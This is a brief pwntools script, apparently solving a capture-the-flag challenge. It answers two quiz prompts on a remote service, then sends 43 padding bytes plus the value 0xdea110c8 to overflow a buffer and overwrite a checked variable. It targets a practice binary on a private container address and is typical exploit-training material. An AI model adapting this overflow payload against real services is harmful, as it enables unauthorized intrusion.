from pwn import *

p = remote('172.17.0.2', 4321)

#p = process('./pwn1')
flag = p32(0xdea110c8)
payload = 'A'*43 + flag
p.sendline('Sir Lancelot of Camelot')
p.read()
p.sendline('To seek the Holy Grail.')
p.read()
p.sendline(payload)
p.interactive()
